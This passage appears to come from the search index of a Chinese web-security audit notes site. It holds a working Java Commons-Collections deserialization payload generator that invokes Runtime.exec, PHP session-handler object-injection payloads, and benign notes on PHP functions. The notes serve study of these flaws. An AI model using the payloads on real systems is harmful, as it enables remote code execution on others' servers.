\u5e94\u7528\u53cd\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u4e2d\u89e6\u53d1\u8be5\u8fc7\u7a0b\u8fd8\u9700\u8981\u627e\u5230\u4e00\u4e2a\u7c7b\uff0c\u5b83\u80fd\u591f\u5728\u53cd\u5e8f\u5217\u5316\u8c03\u7528 readObject() \u7684\u65f6\u5019\u8c03\u7528 TransformedMap \u5185\u7f6e\u7c7b MapEntry \u4e2d\u7684 setValue() \u51fd\u6570\uff0c\u8fd9\u6837\u624d\u80fd\u6784\u6210\u4e00\u6761\u5b8c\u6574\u7684 Gadget \u8c03\u7528\u94fe\u3002\u6070\u597d\u5728 sun.reflect.annotation.AnnotationInvocationHandler \u7c7b\u5177\u6709 Map \u7c7b\u578b\u7684\u53c2\u6570\uff0c\u5e76\u4e14\u5728 readObject() \u65b9\u6cd5\u4e2d\u89e6\u53d1\u4e86\u4e0a\u9762\u6240\u63d0\u5230\u7684\u6240\u6709\u6761\u4ef6\uff0c\u5176\u6e90\u7801\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 private void readObject(java.io.ObjectInputStream s) { ...\u7701\u7565... for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); Class<?> memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { memberValue.setValue(new AnnotationTypeMismatchExceptionProxy(value.getClass() + \"[\" + value + \"]\").setMember(annotationType.members().get(name))); } } } } \u53ef\u4ee5\u6ce8\u610f\u5230 memberValue \u662f AnnotationInvocationHandler \u7c7b\u4e2d\u7c7b\u578b\u58f0\u660e\u4e3a Map<String, Object> \u7684\u6210\u5458\u53d8\u91cf\uff0c\u521a\u597d\u548c\u4e4b\u524d\u6784\u9020\u7684 TransformedMap \u7c7b\u578b\u76f8\u7b26\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 Java \u7684\u53cd\u5c04\u673a\u5236\u52a8\u6001\u7684\u83b7\u53d6 AnnotationInvocationHandler \u7c7b\uff0c\u4f7f\u7528\u7cbe\u5fc3\u6784\u9020\u597d\u7684 TransformedMap \u4f5c\u4e3a\u5b83\u7684\u5b9e\u4f8b\u5316\u53c2\u6570\uff0c\u7136\u540e\u5c06\u5b9e\u4f8b\u5316\u7684 AnnotationInvocationHandler \u8fdb\u884c\u5e8f\u5217\u5316\u5f97\u5230\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6700\u540e\u4f20\u9012\u7ed9\u5177\u6709\u76f8\u5e94\u73af\u5883\u7684\u5e8f\u5217\u5316\u6570\u636e\u4ea4\u4e92\u63a5\u53e3\u4f7f\u4e4b\u89e6\u53d1\u547d\u4ee4\u6267\u884c\u7684 Gadget\uff0c\u5b8c\u6574\u4ee3\u7801\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package exserial.payloads; import java.io.ObjectOutputStream; import java.util.Map; import java.util.HashMap; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.TransformedMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import exserial.payloads.utils.Serializables; public class Commons1 { public static Object getAnnotationInvocationHandler(String command) throws Exception { String[] execArgs = command.split(\",\"); Transformer[] transforms = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer( \"getMethod\", new Class[] {String.class, Class[].class}, new Object[] {\"getRuntime\", new Class[0]} ), new InvokerTransformer( \"invoke\", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]} ), new InvokerTransformer( \"exec\", new Class[] {String[].class}, new Object[] {execArgs} ) }; Transformer transformerChain = new ChainedTransformer(transforms); Map tempMap = new HashMap(); tempMap.put(\"value\", \"does't matter\"); Map exMap = TransformedMap.decorate(tempMap, null, transformerChain); Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(Target.class, exMap); return instance; } public static void main(String[] args) throws Exception { String command = (args.length != 0) ? args[0] : \"/bin/sh,-c,open /Applications/Calculator.app\"; Object obj = getAnnotationInvocationHandler(command); ObjectOutputStream out = new ObjectOutputStream(System.out); out.writeObject(obj); } } \u6700\u7ec8\u7528\u4e00\u6bb5\u8c03\u7528\u94fe\u53ef\u4ee5\u6e05\u6670\u7684\u63cf\u8ff0\u6574\u4e2a\u547d\u4ee4\u6267\u884c\u7684\u89e6\u53d1\u8fc7\u7a0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() AbstractInputCheckedMapDecorator$MapEntry.setValue() TransformedMap.checkSetValue() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() Requires: commons-collections <= 3.2.1 */","title":"Java \u53cd\u5e8f\u5217\u5316\u5229\u7528"},{"location":"web_sec/audit/java/#_3","text":"\u4e4c\u4e91","title":"\u53c2\u8003"},{"location":"web_sec/audit/nodejs/","text":"\u53c2\u8003 \u00b6 https://github.com/PacktPublishing/Learn-Node.js-by-Building-6-Projects/blob/master/Chapter06/elearning/app.js","title":"Nodejs"},{"location":"web_sec/audit/nodejs/#_1","text":"https://github.com/PacktPublishing/Learn-Node.js-by-Building-6-Projects/blob/master/Chapter06/elearning/app.js","title":"\u53c2\u8003"},{"location":"web_sec/audit/php-challenge/","text":"php-challenge\u8bb0\u5f55 \u00b6","title":"php-challenge\u8bb0\u5f55"},{"location":"web_sec/audit/php-challenge/#php-challenge","text":"","title":"php-challenge\u8bb0\u5f55"},{"location":"web_sec/audit/phpSession/","text":"PHP Session \u5e8f\u5217\u5316\u53ca\u53cd\u5e8f\u5217\u5316\u5904\u7406\u5668\u8bbe\u7f6e\u4f7f\u7528\u4e0d\u5f53\u5e26\u6765\u7684\u5b89\u5168\u9690\u60a3 \u00b6 PHP \u5185\u7f6e\u4e86\u591a\u79cd\u5904\u7406\u5668\u7528\u4e8e\u5b58\u53d6 $_SESSION \u6570\u636e\u65f6\u4f1a\u5bf9\u6570\u636e\u8fdb\u884c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\uff0c\u5e38\u7528\u7684\u6709\u4ee5\u4e0b\u4e09\u79cd\uff0c\u5bf9\u5e94\u4e09\u79cd\u4e0d\u540c\u7684\u5904\u7406\u683c\u5f0f\uff1a \u5904\u7406\u5668 \u5bf9\u5e94\u7684\u5b58\u50a8\u683c\u5f0f php \u952e\u540d \uff0b \u7ad6\u7ebf \uff0b \u7ecf\u8fc7 serialize() \u51fd\u6570\u53cd\u5e8f\u5217\u5904\u7406\u7684\u503c php_binary \u952e\u540d\u7684\u957f\u5ea6\u5bf9\u5e94\u7684 ASCII \u5b57\u7b26 \uff0b \u952e\u540d \uff0b \u7ecf\u8fc7 serialize() \u51fd\u6570\u53cd\u5e8f\u5217\u5904\u7406\u7684\u503c php_serialize (php>=5.5.4) \u7ecf\u8fc7 serialize() \u51fd\u6570\u53cd\u5e8f\u5217\u5904\u7406\u7684\u6570\u7ec4 \u914d\u7f6e\u9009\u9879 session.serialize_handler \u00b6 PHP \u63d0\u4f9b\u4e86 session.serialize_handler \u914d\u7f6e\u9009\u9879\uff0c\u901a\u8fc7\u8be5\u9009\u9879\u53ef\u4ee5\u8bbe\u7f6e\u5e8f\u5217\u5316\u53ca\u53cd\u5e8f\u5217\u5316\u65f6\u4f7f\u7528\u7684\u5904\u7406\u5668\uff1a 1 session.serialize_handler \"php\" PHP_INI_ALL \u5b89\u5168\u9690\u60a3 \u00b6 \u901a\u8fc7\u4e0a\u9762\u5bf9\u5b58\u50a8\u683c\u5f0f\u7684\u5206\u6790\uff0c\u5982\u679c PHP \u5728\u53cd\u5e8f\u5217\u5316\u5b58\u50a8\u7684 $_SESSION \u6570\u636e\u65f6\u7684\u4f7f\u7528\u7684\u5904\u7406\u5668\u548c\u5e8f\u5217\u5316\u65f6\u4f7f\u7528\u7684\u5904\u7406\u5668\u4e0d\u540c\uff0c\u4f1a\u5bfc\u81f4\u6570\u636e\u65e0\u6cd5\u6b63\u786e\u53cd\u5e8f\u5217\u5316\uff0c\u901a\u8fc7\u7279\u6b8a\u7684\u6784\u9020\uff0c\u751a\u81f3\u53ef\u4ee5\u4f2a\u9020\u4efb\u610f\u6570\u636e\uff1a\uff09 1 $_SESSION['ryat'] = '|O:8:\"stdClass\":0:{}'; \u4f8b\u5982\u4e0a\u9762\u7684 $_SESSION \u6570\u636e\uff0c\u5728\u5b58\u50a8\u65f6\u4f7f\u7528\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e3a php_serialize\uff0c\u5b58\u50a8\u7684\u683c\u5f0f\u5982\u4e0b\uff1a 1 a:1:{s:4:\"ryat\";s:20:\"|O:8:\"stdClass\":0:{}\";} \u5728\u8bfb\u53d6\u6570\u636e\u65f6\u5982\u679c\u7528\u7684\u53cd\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e0d\u662f php_serialize\uff0c\u800c\u662f php \u7684\u8bdd\uff0c\u90a3\u4e48\u53cd\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e\u5c06\u4f1a\u53d8\u6210\uff1a 1 2 3 4 5 6 // var_dump($_SESSION); array(1) { [\"a:1:{s:4:\"ryat\";s:20:\"\"]=> object(stdClass)#1 (0) { } } \u53ef\u4ee5\u770b\u5230\uff0c\u901a\u8fc7\u6ce8\u5165 | \u5b57\u7b26\u4f2a\u9020\u4e86\u5bf9\u8c61\u7684\u5e8f\u5217\u5316\u6570\u636e\uff0c\u6210\u529f\u5b9e\u4f8b\u5316\u4e86 stdClass \u5bf9\u8c61\uff1a\uff09 \u5b9e\u9645\u5229\u7528 \u00b6 \u5f53\u914d\u7f6e\u9009\u9879 session.auto_start\uff1dOn\uff0c\u4f1a\u81ea\u52a8\u6ce8\u518c Session \u4f1a\u8bdd\uff0c\u56e0\u4e3a\u8be5\u8fc7\u7a0b\u662f\u53d1\u751f\u5728\u811a\u672c\u4ee3\u7801\u6267\u884c\u524d\uff0c\u6240\u4ee5\u5728\u811a\u672c\u4e2d\u8bbe\u5b9a\u7684\u5305\u62ec\u5e8f\u5217\u5316\u5904\u7406\u5668\u5728\u5185\u7684 session \u76f8\u5173\u914d\u9009\u9879\u7684\u8bbe\u7f6e\u662f\u4e0d\u8d77\u4f5c\u7528\u7684\uff0c\u56e0\u6b64\u4e00\u4e9b\u9700\u8981\u5728\u811a\u672c\u4e2d\u8bbe\u7f6e\u5e8f\u5217\u5316\u5904\u7406\u5668\u914d\u7f6e\u7684\u7a0b\u5e8f\u4f1a\u5728 session.auto_start\uff1dOn \u65f6\uff0c\u9500\u6bc1\u81ea\u52a8\u751f\u6210\u7684 Session \u4f1a\u8bdd\uff0c\u7136\u540e\u8bbe\u7f6e\u9700\u8981\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\uff0c\u518d\u8c03\u7528 session_start() \u51fd\u6570\u6ce8\u518c\u4f1a\u8bdd\uff0c\u8fd9\u65f6\u5982\u679c\u811a\u672c\u4e2d\u8bbe\u7f6e\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e0e php.ini \u4e2d\u8bbe\u7f6e\u7684\u4e0d\u540c\uff0c\u5c31\u4f1a\u51fa\u73b0\u5b89\u5168\u95ee\u9898\uff0c\u5982\u4e0b\u9762\u7684\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 //foo.php if (ini_get('session.auto_start')) { session_destroy(); } ini_set('session.serialize_handler', 'php_serialize'); session_start(); $_SESSION['ryat'] = $_GET['ryat']; \u5f53\u7b2c\u4e00\u6b21\u8bbf\u95ee\u8be5\u811a\u672c\uff0c\u5e76\u63d0\u4ea4\u6570\u636e\u5982\u4e0b\uff1a 1 foo.php?ryat=|O:8:\"stdClass\":0:{} \u811a\u672c\u4f1a\u6309\u7167 php_serialize \u5904\u7406\u5668\u7684\u5e8f\u5217\u5316\u683c\u5f0f\u5b58\u50a8\u6570\u636e\uff1a 1 a:1:{s:4:\"ryat\";s:20:\"|O:8:\"stdClass\":0:{}\";} \u5f53\u7b2c\u4e8c\u6b21\u8bbf\u95ee\u8be5\u811a\u672c\u65f6\uff0cPHP \u4f1a\u6309\u7167 php.ini \u91cc\u8bbe\u7f6e\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\u53cd\u5e8f\u5217\u5316\u5b58\u50a8\u7684\u6570\u636e\uff0c\u8fd9\u65f6\u5982\u679c php.ini \u91cc\u8bbe\u7f6e\u7684\u662f php \u5904\u7406\u5668\u7684\u8bdd\uff0c\u5c06\u4f1a\u53cd\u5e8f\u5217\u5316\u4f2a\u9020\u7684\u6570\u636e\uff0c\u6210\u529f\u5b9e\u4f8b\u5316\u4e86 stdClass \u5bf9\u8c61\uff1a\uff09 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u56e0\u4e3a PHP \u81ea\u52a8\u6ce8\u518c Session \u4f1a\u8bdd\u662f\u5728\u811a\u672c\u6267\u884c\u524d\uff0c\u6240\u4ee5\u901a\u8fc7\u8be5\u65b9\u5f0f\u53ea\u80fd\u6ce8\u5165 PHP \u7684\u5185\u7f6e\u7c7b\u3002 ii\uff09\u5f53 session.auto_start\uff1dOff \u65f6\uff1a \u00b6 \u5f53\u914d\u7f6e\u9009\u9879 session.auto_start\uff1dOff\uff0c\u4e24\u4e2a\u811a\u672c\u6ce8\u518c Session \u4f1a\u8bdd\u65f6\u4f7f\u7528\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e0d\u540c\uff0c\u5c31\u4f1a\u51fa\u73b0\u5b89\u5168\u95ee\u9898\uff0c\u5982\u4e0b\u9762\u7684\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 //foo1.php ini_set('session.serialize_handler', 'php_serialize'); session_start(); $_SESSION['ryat'] = $_GET['ryat']; //foo2.php ini_set('session.serialize_handler', 'php'); //or session.serialize_handler set to php in php.ini session_start(); class ryat { var $hi; function __wakeup() { echo 'hi'; } function __destruct() { echo $this->hi; } } \u5f53\u8bbf\u95ee foo1.php \u65f6\uff0c\u63d0\u4ea4\u6570\u636e\u5982\u4e0b\uff1a 1 foo1.php?ryat=|O:4:\"ryat\":1:{s:2:\"hi\";s:4:\"ryat\";} \u811a\u672c\u4f1a\u6309\u7167 php_serialize \u5904\u7406\u5668\u7684\u5e8f\u5217\u5316\u683c\u5f0f\u5b58\u50a8\u6570\u636e\uff0c\u8bbf\u95ee foo2.php \u65f6\uff0c\u5219\u4f1a\u6309\u7167 php \u5904\u7406\u5668\u7684\u53cd\u5e8f\u5217\u5316\u683c\u5f0f\u8bfb\u53d6\u6570\u636e\uff0c\u8fd9\u65f6\u5c06\u4f1a\u53cd\u5e8f\u5217\u5316\u4f2a\u9020\u7684\u6570\u636e\uff0c\u6210\u529f\u5b9e\u4f8b\u5316\u4e86 ryat \u5bf9\u8c61\uff0c\u5e76\u5c06\u4f1a\u6267\u884c\u7c7b\u4e2d\u7684 __wakeup \u65b9\u6cd5\u548c __destruct \u65b9\u6cd5\uff1a\uff09 \u53c2\u8003 \u00b6 \u4e4c\u4e91","title":"PHP Session \u5e8f\u5217\u5316\u53ca\u53cd\u5e8f\u5217\u5316\u5904\u7406\u5668\u8bbe\u7f6e\u4f7f\u7528\u4e0d\u5f53\u5e26\u6765\u7684\u5b89\u5168\u9690\u60a3"},{"location":"web_sec/audit/phpSession/#php-session","text":"PHP \u5185\u7f6e\u4e86\u591a\u79cd\u5904\u7406\u5668\u7528\u4e8e\u5b58\u53d6 $_SESSION \u6570\u636e\u65f6\u4f1a\u5bf9\u6570\u636e\u8fdb\u884c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\uff0c\u5e38\u7528\u7684\u6709\u4ee5\u4e0b\u4e09\u79cd\uff0c\u5bf9\u5e94\u4e09\u79cd\u4e0d\u540c\u7684\u5904\u7406\u683c\u5f0f\uff1a \u5904\u7406\u5668 \u5bf9\u5e94\u7684\u5b58\u50a8\u683c\u5f0f php \u952e\u540d \uff0b \u7ad6\u7ebf \uff0b \u7ecf\u8fc7 serialize() \u51fd\u6570\u53cd\u5e8f\u5217\u5904\u7406\u7684\u503c php_binary \u952e\u540d\u7684\u957f\u5ea6\u5bf9\u5e94\u7684 ASCII \u5b57\u7b26 \uff0b \u952e\u540d \uff0b \u7ecf\u8fc7 serialize() \u51fd\u6570\u53cd\u5e8f\u5217\u5904\u7406\u7684\u503c php_serialize (php>=5.5.4) \u7ecf\u8fc7 serialize() \u51fd\u6570\u53cd\u5e8f\u5217\u5904\u7406\u7684\u6570\u7ec4","title":"PHP Session \u5e8f\u5217\u5316\u53ca\u53cd\u5e8f\u5217\u5316\u5904\u7406\u5668\u8bbe\u7f6e\u4f7f\u7528\u4e0d\u5f53\u5e26\u6765\u7684\u5b89\u5168\u9690\u60a3"},{"location":"web_sec/audit/phpSession/#sessionserialize_handler","text":"PHP \u63d0\u4f9b\u4e86 session.serialize_handler \u914d\u7f6e\u9009\u9879\uff0c\u901a\u8fc7\u8be5\u9009\u9879\u53ef\u4ee5\u8bbe\u7f6e\u5e8f\u5217\u5316\u53ca\u53cd\u5e8f\u5217\u5316\u65f6\u4f7f\u7528\u7684\u5904\u7406\u5668\uff1a 1 session.serialize_handler \"php\" PHP_INI_ALL","title":"\u914d\u7f6e\u9009\u9879 session.serialize_handler"},{"location":"web_sec/audit/phpSession/#_1","text":"\u901a\u8fc7\u4e0a\u9762\u5bf9\u5b58\u50a8\u683c\u5f0f\u7684\u5206\u6790\uff0c\u5982\u679c PHP \u5728\u53cd\u5e8f\u5217\u5316\u5b58\u50a8\u7684 $_SESSION \u6570\u636e\u65f6\u7684\u4f7f\u7528\u7684\u5904\u7406\u5668\u548c\u5e8f\u5217\u5316\u65f6\u4f7f\u7528\u7684\u5904\u7406\u5668\u4e0d\u540c\uff0c\u4f1a\u5bfc\u81f4\u6570\u636e\u65e0\u6cd5\u6b63\u786e\u53cd\u5e8f\u5217\u5316\uff0c\u901a\u8fc7\u7279\u6b8a\u7684\u6784\u9020\uff0c\u751a\u81f3\u53ef\u4ee5\u4f2a\u9020\u4efb\u610f\u6570\u636e\uff1a\uff09 1 $_SESSION['ryat'] = '|O:8:\"stdClass\":0:{}'; \u4f8b\u5982\u4e0a\u9762\u7684 $_SESSION \u6570\u636e\uff0c\u5728\u5b58\u50a8\u65f6\u4f7f\u7528\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e3a php_serialize\uff0c\u5b58\u50a8\u7684\u683c\u5f0f\u5982\u4e0b\uff1a 1 a:1:{s:4:\"ryat\";s:20:\"|O:8:\"stdClass\":0:{}\";} \u5728\u8bfb\u53d6\u6570\u636e\u65f6\u5982\u679c\u7528\u7684\u53cd\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e0d\u662f php_serialize\uff0c\u800c\u662f php \u7684\u8bdd\uff0c\u90a3\u4e48\u53cd\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e\u5c06\u4f1a\u53d8\u6210\uff1a 1 2 3 4 5 6 // var_dump($_SESSION); array(1) { [\"a:1:{s:4:\"ryat\";s:20:\"\"]=> object(stdClass)#1 (0) { } } \u53ef\u4ee5\u770b\u5230\uff0c\u901a\u8fc7\u6ce8\u5165 | \u5b57\u7b26\u4f2a\u9020\u4e86\u5bf9\u8c61\u7684\u5e8f\u5217\u5316\u6570\u636e\uff0c\u6210\u529f\u5b9e\u4f8b\u5316\u4e86 stdClass \u5bf9\u8c61\uff1a\uff09","title":"\u5b89\u5168\u9690\u60a3"},{"location":"web_sec/audit/phpSession/#_2","text":"\u5f53\u914d\u7f6e\u9009\u9879 session.auto_start\uff1dOn\uff0c\u4f1a\u81ea\u52a8\u6ce8\u518c Session \u4f1a\u8bdd\uff0c\u56e0\u4e3a\u8be5\u8fc7\u7a0b\u662f\u53d1\u751f\u5728\u811a\u672c\u4ee3\u7801\u6267\u884c\u524d\uff0c\u6240\u4ee5\u5728\u811a\u672c\u4e2d\u8bbe\u5b9a\u7684\u5305\u62ec\u5e8f\u5217\u5316\u5904\u7406\u5668\u5728\u5185\u7684 session \u76f8\u5173\u914d\u9009\u9879\u7684\u8bbe\u7f6e\u662f\u4e0d\u8d77\u4f5c\u7528\u7684\uff0c\u56e0\u6b64\u4e00\u4e9b\u9700\u8981\u5728\u811a\u672c\u4e2d\u8bbe\u7f6e\u5e8f\u5217\u5316\u5904\u7406\u5668\u914d\u7f6e\u7684\u7a0b\u5e8f\u4f1a\u5728 session.auto_start\uff1dOn \u65f6\uff0c\u9500\u6bc1\u81ea\u52a8\u751f\u6210\u7684 Session \u4f1a\u8bdd\uff0c\u7136\u540e\u8bbe\u7f6e\u9700\u8981\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\uff0c\u518d\u8c03\u7528 session_start() \u51fd\u6570\u6ce8\u518c\u4f1a\u8bdd\uff0c\u8fd9\u65f6\u5982\u679c\u811a\u672c\u4e2d\u8bbe\u7f6e\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e0e php.ini \u4e2d\u8bbe\u7f6e\u7684\u4e0d\u540c\uff0c\u5c31\u4f1a\u51fa\u73b0\u5b89\u5168\u95ee\u9898\uff0c\u5982\u4e0b\u9762\u7684\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 //foo.php if (ini_get('session.auto_start')) { session_destroy(); } ini_set('session.serialize_handler', 'php_serialize'); session_start(); $_SESSION['ryat'] = $_GET['ryat']; \u5f53\u7b2c\u4e00\u6b21\u8bbf\u95ee\u8be5\u811a\u672c\uff0c\u5e76\u63d0\u4ea4\u6570\u636e\u5982\u4e0b\uff1a 1 foo.php?ryat=|O:8:\"stdClass\":0:{} \u811a\u672c\u4f1a\u6309\u7167 php_serialize \u5904\u7406\u5668\u7684\u5e8f\u5217\u5316\u683c\u5f0f\u5b58\u50a8\u6570\u636e\uff1a 1 a:1:{s:4:\"ryat\";s:20:\"|O:8:\"stdClass\":0:{}\";} \u5f53\u7b2c\u4e8c\u6b21\u8bbf\u95ee\u8be5\u811a\u672c\u65f6\uff0cPHP \u4f1a\u6309\u7167 php.ini \u91cc\u8bbe\u7f6e\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\u53cd\u5e8f\u5217\u5316\u5b58\u50a8\u7684\u6570\u636e\uff0c\u8fd9\u65f6\u5982\u679c php.ini \u91cc\u8bbe\u7f6e\u7684\u662f php \u5904\u7406\u5668\u7684\u8bdd\uff0c\u5c06\u4f1a\u53cd\u5e8f\u5217\u5316\u4f2a\u9020\u7684\u6570\u636e\uff0c\u6210\u529f\u5b9e\u4f8b\u5316\u4e86 stdClass \u5bf9\u8c61\uff1a\uff09 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u56e0\u4e3a PHP \u81ea\u52a8\u6ce8\u518c Session \u4f1a\u8bdd\u662f\u5728\u811a\u672c\u6267\u884c\u524d\uff0c\u6240\u4ee5\u901a\u8fc7\u8be5\u65b9\u5f0f\u53ea\u80fd\u6ce8\u5165 PHP \u7684\u5185\u7f6e\u7c7b\u3002","title":"\u5b9e\u9645\u5229\u7528"},{"location":"web_sec/audit/phpSession/#ii-sessionauto_startoff","text":"\u5f53\u914d\u7f6e\u9009\u9879 session.auto_start\uff1dOff\uff0c\u4e24\u4e2a\u811a\u672c\u6ce8\u518c Session \u4f1a\u8bdd\u65f6\u4f7f\u7528\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e0d\u540c\uff0c\u5c31\u4f1a\u51fa\u73b0\u5b89\u5168\u95ee\u9898\uff0c\u5982\u4e0b\u9762\u7684\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 //foo1.php ini_set('session.serialize_handler', 'php_serialize'); session_start(); $_SESSION['ryat'] = $_GET['ryat']; //foo2.php ini_set('session.serialize_handler', 'php'); //or session.serialize_handler set to php in php.ini session_start(); class ryat { var $hi; function __wakeup() { echo 'hi'; } function __destruct() { echo $this->hi; } } \u5f53\u8bbf\u95ee foo1.php \u65f6\uff0c\u63d0\u4ea4\u6570\u636e\u5982\u4e0b\uff1a 1 foo1.php?ryat=|O:4:\"ryat\":1:{s:2:\"hi\";s:4:\"ryat\";} \u811a\u672c\u4f1a\u6309\u7167 php_serialize \u5904\u7406\u5668\u7684\u5e8f\u5217\u5316\u683c\u5f0f\u5b58\u50a8\u6570\u636e\uff0c\u8bbf\u95ee foo2.php \u65f6\uff0c\u5219\u4f1a\u6309\u7167 php \u5904\u7406\u5668\u7684\u53cd\u5e8f\u5217\u5316\u683c\u5f0f\u8bfb\u53d6\u6570\u636e\uff0c\u8fd9\u65f6\u5c06\u4f1a\u53cd\u5e8f\u5217\u5316\u4f2a\u9020\u7684\u6570\u636e\uff0c\u6210\u529f\u5b9e\u4f8b\u5316\u4e86 ryat \u5bf9\u8c61\uff0c\u5e76\u5c06\u4f1a\u6267\u884c\u7c7b\u4e2d\u7684 __wakeup \u65b9\u6cd5\u548c __destruct \u65b9\u6cd5\uff1a\uff09","title":"ii\uff09\u5f53 session.auto_start\uff1dOff \u65f6\uff1a"},{"location":"web_sec/audit/phpSession/#_3","text":"\u4e4c\u4e91","title":"\u53c2\u8003"},{"location":"web_sec/audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/","text":"php\u4e0d\u5e38\u7528\u51fd\u6570 \u00b6 call_user_func_array \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 <?php function foobar ( $arg , $arg2 ) { echo __FUNCTION__ , \" got $arg and $arg2\\n \" ; } class foo { function bar ( $arg , $arg2 ) { echo __METHOD__ , \" got $arg and $arg2\\n \" ; } } // Call the foobar() function with 2 arguments call_user_func_array ( \"foobar\" , array ( \"one\" , \"two\" )); // Call the $foo->bar() method with 2 arguments $foo = new foo ; call_user_func_array ( array ( $foo , \"bar\" ), array ( \"three\" , \"four\" )); ?> \u4f7f\u7528\u547d\u540d\u7a7a\u95f4\u7684\u60c5\u51b5\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 <?php namespace Foobar ; class Foo { static public function test ( $name ) { print \"Hello { $name } ! \\n \" ; } } // As of PHP 5.3.0 call_user_func_array ( __NAMESPACE__ . '\\Foo::test' , array ( 'Hannes' )); // As of PHP 5.3.0 call_user_func_array ( array ( __NAMESPACE__ . '\\Foo' , 'test' ), array ( 'Philip' )); ?> How could I call the constructor of a class with call_user_func_array \u4e0b\u9762\u8fd9\u79cd\u65b9\u5f0f\u4e0d\u53ef\u80fd\uff1a 1 2 $obj = new $class(); call_user_func_array(array($obj, '__construct'), $args); You can use reflection like: 1 2 $reflect = new ReflectionClass($class); $instance = $reflect->newInstanceArgs($args); As of PHP 5.6.0, the ... operator can also be used for this purpose. 1 2 3 4 5 6 if(version_compare(PHP_VERSION, '5.6.0', '>=')){ $instance = new $class(...$args); } else { $reflect = new ReflectionClass($class); $instance = $reflect->newInstanceArgs($args); } is_file or file_exists \u00b6 is_file() will return false if the given path points to a directory. file_exists() will return true if the given path points to a valid file or directory. So it would depend entirely on your needs. If you want to know specifically if it's a file or not, use is_file() . Otherwise, use file_exists() . is_file \u4e0d\u4f1a\u89e3\u6790\u76ee\u5f55\uff0c\u4e5f\u4e0d\u4f1a\u89e3\u6790\u7b26\u53f7\u94fe\u63a5 file_put_contents \u00b6 \u4f1a\u8986\u76d6\u6587\u4ef6\u4e4b\u524d\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u4e0d\u4f1a\u521b\u5efa\u76ee\u5f55 1 2 $month = date('Yd') file_put_contents(\"upload/promotions/\".$month.\"/\".$image, $contents_data); //\u62a5\u9519\uff01\uff01No such file or directory \u89e3\u51b3\uff1a 1 2 3 4 5 6 if (!is_dir('upload/promotions/' . $month)) { // dir doesn't exist, make it mkdir('upload/promotions/' . $month); } file_put_contents('upload/promotions/' . $month . '/' . $image, $contents_data); glob \u00b6 \u5bfb\u627e\u4e0e\u6a21\u5f0f\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84 \u4e3e\u4f8b 1 2 3 4 5 <?php foreach ( glob ( \"*.txt\" ) as $filename ) { echo \" $filename size \" . filesize ( $filename ) . \" \\n \" ; } ?> \u7528 glob \u51fd\u6570\u66ff\u4ee3 opendir touch \u00b6 \u8bbe\u5b9a\u6587\u4ef6\u7684\u8bbf\u95ee\u548c\u4fee\u6539\u65f6\u95f4 touch ( string filename [, int filename<code>[, int</code> time = time() [, int $atime ]] ) : bool \u5c1d\u8bd5\u5c06\u7531 filename \u7ed9\u51fa\u7684\u6587\u4ef6\u7684\u8bbf\u95ee\u548c\u4fee\u6539\u65f6\u95f4\u8bbe\u5b9a\u4e3a\u7ed9\u51fa\u7684 time \u3002 \u6ce8\u610f\u8bbf\u95ee\u65f6\u95f4\u603b\u662f\u4f1a\u88ab\u4fee\u6539\u7684\uff0c\u4e0d\u8bba\u6709\u51e0\u4e2a\u53c2\u6570\u3002 